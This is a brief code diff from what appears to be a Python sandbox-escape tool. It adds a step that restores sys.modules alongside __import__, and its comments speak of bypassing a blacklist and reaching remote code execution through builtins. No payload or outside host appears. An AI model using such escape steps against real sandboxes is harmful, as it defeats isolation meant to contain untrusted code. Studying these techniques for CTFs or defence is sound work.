@@ -334,6 +334,7 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
 
     # Step9: Try to restore __import__
     try_to_restore('import', __import__.__class__)
+    try_to_restore('modules', sys.modules.__class__)
 
     # Step10: Try to RCE directly with builtins 
     if 'BUILTINS_SET' in tags or 'MOUDLE_BUILTINS' in tags:
